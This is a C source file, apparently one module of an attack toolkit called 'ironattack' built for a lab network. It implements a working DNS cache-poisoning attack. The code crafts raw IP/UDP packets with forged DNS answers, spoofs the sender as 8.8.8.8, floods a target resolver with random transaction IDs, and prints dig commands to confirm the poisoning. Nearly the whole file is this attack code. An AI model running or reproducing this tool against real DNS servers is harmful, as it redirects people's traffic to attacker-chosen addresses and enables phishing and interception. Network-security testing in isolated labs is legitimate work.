/*
 * dns_spoof_ext — External DNS cache poisoning tool (Phase 17d)
 *
 * Sends forged DNS responses to the target DNS server via raw socket,
 * attempting to poison its cache (Kaminsky-style brute-force attack).
 *
 * The attacker floods the target with forged responses containing random
 * transaction IDs. If one matches an outstanding query, the cache is poisoned.
 *
 * Usage:
 *   sudo ./ironattack dns-spoof-ext --domain <name> --fake-ip <ip> \
 *       --target <ip> [--iface <name>] [--count <n>]
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/ip.h>

#define DNS_PORT 53

static uint16_t ip_checksum(const void *data, int len) {
    const uint8_t *p = data;
    uint32_t sum = 0;
    for (int i = 0; i < len - 1; i += 2)
        sum += (p[i] << 8) | p[i + 1];
    if (len & 1) sum += p[len - 1] << 8;
    while (sum >> 16) sum = (sum >> 16) + (sum & 0xFFFF);
    return ~sum & 0xFFFF;
}

/* Build DNS response payload for a given domain and fake IP */
static int build_dns_response(uint8_t *buf, int buf_len,
                              uint16_t txn_id, const char *domain,
                              uint32_t fake_ip_nbo) {
    if (buf_len < 128) return -1;
    int pos = 0;

    /* DNS header */
    buf[pos++] = (txn_id >> 8) & 0xFF;
    buf[pos++] = txn_id & 0xFF;
    buf[pos++] = 0x81; buf[pos++] = 0x80; /* QR=1, RD=1, RA=1 */
    buf[pos++] = 0x00; buf[pos++] = 0x01; /* QDCOUNT=1 */
    buf[pos++] = 0x00; buf[pos++] = 0x01; /* ANCOUNT=1 */
    buf[pos++] = 0x00; buf[pos++] = 0x00; /* NSCOUNT=0 */
    buf[pos++] = 0x00; buf[pos++] = 0x00; /* ARCOUNT=0 */

    /* Question section: encode domain */
    const char *p = domain;
    while (*p) {
        const char *dot = strchr(p, '.');
        int label_len = dot ? (int)(dot - p) : (int)strlen(p);
        buf[pos++] = (uint8_t)label_len;
        memcpy(buf + pos, p, label_len);
        pos += label_len;
        p += label_len + (dot ? 1 : 0);
        if (!dot) break;
    }
    buf[pos++] = 0; /* end of name */
    buf[pos++] = 0x00; buf[pos++] = 0x01; /* QTYPE=A */
    buf[pos++] = 0x00; buf[pos++] = 0x01; /* QCLASS=IN */

    /* Answer section: pointer to name + A record */
    buf[pos++] = 0xC0; buf[pos++] = 0x0C; /* name pointer to offset 12 */
    buf[pos++] = 0x00; buf[pos++] = 0x01; /* TYPE=A */
    buf[pos++] = 0x00; buf[pos++] = 0x01; /* CLASS=IN */
    buf[pos++] = 0x00; buf[pos++] = 0x00;
    buf[pos++] = 0x01; buf[pos++] = 0x2C; /* TTL=300s */
    buf[pos++] = 0x00; buf[pos++] = 0x04; /* RDLENGTH=4 */
    memcpy(buf + pos, &fake_ip_nbo, 4);
    pos += 4;

    return pos;
}

/* Build full IP+UDP+DNS packet */
static int build_spoofed_packet(uint8_t *pkt, int pkt_len,
                                uint32_t src_ip, uint32_t dst_ip,
                                uint16_t src_port, uint16_t dst_port,
                                const uint8_t *dns_payload, int dns_len) {
    int ip_total = 20 + 8 + dns_len;
    if (pkt_len < ip_total) return -1;
    memset(pkt, 0, 20 + 8);

    /* IP header */
    pkt[0] = 0x45;
    pkt[2] = (ip_total >> 8) & 0xFF; pkt[3] = ip_total & 0xFF;
    pkt[4] = 0x00; pkt[5] = 0x01; /* ID */
    pkt[8] = 64; /* TTL */
    pkt[9] = 17; /* UDP */
    memcpy(pkt + 12, &src_ip, 4);
    memcpy(pkt + 16, &dst_ip, 4);
    uint16_t ck = ip_checksum(pkt, 20);
    pkt[10] = (ck >> 8) & 0xFF; pkt[11] = ck & 0xFF;

    /* UDP header */
    uint8_t *udp = pkt + 20;
    udp[0] = (src_port >> 8) & 0xFF; udp[1] = src_port & 0xFF;
    udp[2] = (dst_port >> 8) & 0xFF; udp[3] = dst_port & 0xFF;
    uint16_t udp_len = 8 + dns_len;
    udp[4] = (udp_len >> 8) & 0xFF; udp[5] = udp_len & 0xFF;
    /* UDP checksum = 0 (optional for IPv4) */

    /* DNS payload */
    memcpy(udp + 8, dns_payload, dns_len);

    return ip_total;
}

int cmd_dns_spoof_ext(int argc, char **argv) {
    const char *domain = NULL, *fake_ip_str = NULL, *target_str = NULL;
    const char *iface = "iron0";
    int count = 50;

    for (int i = 0; i < argc; i++) {
        if (strcmp(argv[i], "--domain") == 0 && i + 1 < argc) domain = argv[++i];
        else if (strcmp(argv[i], "--fake-ip") == 0 && i + 1 < argc) fake_ip_str = argv[++i];
        else if (strcmp(argv[i], "--target") == 0 && i + 1 < argc) target_str = argv[++i];
        else if (strcmp(argv[i], "--iface") == 0 && i + 1 < argc) iface = argv[++i];
        else if (strcmp(argv[i], "--count") == 0 && i + 1 < argc) count = atoi(argv[++i]);
    }

    if (!domain || !fake_ip_str || !target_str) {
        fprintf(stderr, "Error: --domain, --fake-ip, and --target required\n");
        return 1;
    }

    struct in_addr fake_addr, target_addr;
    if (inet_pton(AF_INET, fake_ip_str, &fake_addr) != 1) {
        fprintf(stderr, "Error: invalid --fake-ip\n"); return 1;
    }
    if (inet_pton(AF_INET, target_str, &target_addr) != 1) {
        fprintf(stderr, "Error: invalid --target\n"); return 1;
    }

    /* Open raw socket for sending */
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd < 0) {
        fprintf(stderr, "Error: cannot open raw socket (run with sudo)\n");
        return 1;
    }
    int one = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    setsockopt(fd, SOL_SOCKET, SO_BINDTODEVICE, &ifr, sizeof(ifr));

    printf("=== External DNS Cache Poisoning (Phase 17d) ===\n");
    printf("  Domain:  %s\n", domain);
    printf("  Fake IP: %s\n", fake_ip_str);
    printf("  Target:  %s (DNS server)\n", target_str);
    printf("  Iface:   %s\n", iface);
    printf("  Count:   %d\n", count);
    printf("  Method:  Flood forged DNS responses (Kaminsky-style)\n");
    printf("           Spoofing source as upstream DNS (8.8.8.8)\n\n");

    srand(time(NULL));
    int sent = 0;

    /* Spoof source as upstream DNS server */
    uint32_t spoof_src = inet_addr("8.8.8.8");

    for (int i = 0; i < count; i++) {
        uint16_t txn_id = (uint16_t)(rand() & 0xFFFF);

        uint8_t dns_resp[256];
        int dns_len = build_dns_response(dns_resp, sizeof(dns_resp),
                                         txn_id, domain, fake_addr.s_addr);
        if (dns_len < 0) continue;

        uint8_t pkt[512];
        int pkt_len = build_spoofed_packet(pkt, sizeof(pkt),
                                           spoof_src, target_addr.s_addr,
                                           DNS_PORT, DNS_PORT,
                                           dns_resp, dns_len);
        if (pkt_len < 0) continue;

        struct sockaddr_in dst;
        memset(&dst, 0, sizeof(dst));
        dst.sin_family = AF_INET;
        dst.sin_addr = target_addr;

        int rc = sendto(fd, pkt, pkt_len, 0,
                       (struct sockaddr *)&dst, sizeof(dst));
        if (rc > 0) sent++;
        usleep(1000); /* ~1000 pps */
    }

    printf("  Sent: %d forged DNS responses\n", sent);
    printf("  Payload: %s -> %s (TTL=300s)\n\n", domain, fake_ip_str);

    if (sent > 0) {
        printf("  To verify poisoning:\n");
        printf("    ironctl> dns cache\n");
        printf("    dig @%s %s +short\n\n", target_str, domain);
    }

    close(fd);
    return 0;
}
